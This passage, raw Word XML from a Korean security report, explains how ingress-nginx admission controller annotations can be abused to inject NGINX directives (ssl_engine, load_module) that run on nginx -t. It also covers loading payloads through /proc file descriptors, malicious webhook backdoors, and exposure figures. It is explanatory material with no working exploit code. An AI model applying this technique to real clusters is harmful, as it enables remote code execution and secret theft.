          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 검증이 미흡하면 공격자가 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>개행</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 문자(\n), 세미콜론(;), 특수 directive(예: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>ssl_engine</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>, exec, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>load_module</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>를</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 삽입해 의도하지 않은 NGINX 설정을 주입할 수 있습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="683FE04E" w14:textId="44252377" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실제 공격 시나리오</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="758D055F" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격자는 auth-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>url</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>, auth-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>tls</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>-match-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>cn</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t> 등 annotation에 악성 값을 삽입해 Ingress 객체를 생성합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E140313" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Controller가 임시 NGINX 설정 파일을 생성할 때, 해당 값이 그대로 삽입됩니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20C6C998" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>nginx -t 명령으로 설정 검증 시, 주입된 directive가 실행되어 악성 라이브러리 로드 또는 명령 실행이 발생합니다.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05308FF5" w14:textId="747E3824" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="106"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>이 과정에서 /proc/&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>pid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>&gt;/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>fd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>/&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>fd</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">&gt; 경로를 활용해 임시 업로드 파일(공격 페이로드)을 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>로드하는</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 우회 기법도 사용됩니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="330F6546" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>Admission Webhook 공격 기법</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70ACFBE7" w14:textId="5FCE65EB" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격 원리</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>Admission Controller(특히 Validating Admission Webhook)는 Ingress 객체 생성/수정 시 API 요청을 받아 임시 설정 파일을 생성하고, nginx -t로 검증합니다.</w:t>
      </w:r>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">이때 Admission Controller가 네트워크에 노출되어 있고 인증이 없다면, 공격자는 직접 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>AdmissionReview</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 요청을 보내 악성 Ingress 객체를 심을 수 있습니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3748C614" w14:textId="0C28D279" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>공격 효과</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DE3BC29" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>인증 없는 원격 코드 실행(RCE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24B67B5D" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클러스터 전체 Secrets 접근 및 탈취</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A76C0A" w14:textId="77777777" w:rsidR="006E05D4" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="006E05D4">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>추가적인 lateral movement(노드 간 이동, 클라우드 메타데이터 탈취 등)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6609E90A" w14:textId="2D0F4284" w:rsidR="00BA5E73" w:rsidRPr="006E05D4" w:rsidRDefault="006E05D4" w:rsidP="00BA5E73">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="107"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">Webhook 자체를 악용한 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>백도어</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>공격자가 클러스터 내에 악성 mutating/validating webhook을 심으면, 모든 신규 리소스에 자동으로 악성 설정이나 백도어를 주입할 수 있습니다. 이 방식은 탐지 회피 및 지속적 침투에 활용됩니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="47E4132D" w14:textId="14B627ED" w:rsidR="00BA5E73" w:rsidRPr="00BA5E73" w:rsidRDefault="00BA5E73" w:rsidP="00BA5E73">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00BA5E73">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve">9.3 </w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>클라우드</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4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6E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>환경</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4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6E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>내</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4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6E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>보안</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4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6E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4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6E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>대응</w:t>
      </w:r>
      <w:r w:rsidR="006E05D4" w:rsidRPr="006E05D4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6E05D4" w:rsidRPr="006E05D4">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:cs="맑은 고딕" w:hint="eastAsia"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>사례</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EA18030" w14:textId="6DB04D7D" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="108"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>취약점 노출 현황</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t>2025년 기준, Fortune 500 포함 6,500여 개 클러스터가 인터넷에 Admission Controller를 노출한 것으로 확인되었습니다. 전체 클라우드 환경의 약 43%가 영향권에 있습니다.</w:t>
      </w:r>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">이는 Kubernetes 클러스터가 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>멀티테넌트</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 환경, 대규모 자동화 배포 등으로 인해 네트워크 경계가 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>느슨해진</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t xml:space="preserve"> 결과입니다</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕" w:hint="eastAsia"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34BF80CA" w14:textId="1F99A614" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="108"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009E3DDA">
        <w:rPr>
          <w:rFonts w:ascii="맑은 고딕" w:eastAsia="맑은 고딕" w:hAnsi="맑은 고딕"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
        <w:t>실제 대응 사례</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31BC8692" w14:textId="648515DF" w:rsidR="009E3DDA" w:rsidRPr="009E3DDA" w:rsidRDefault="009E3DDA" w:rsidP="009E3DDA">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
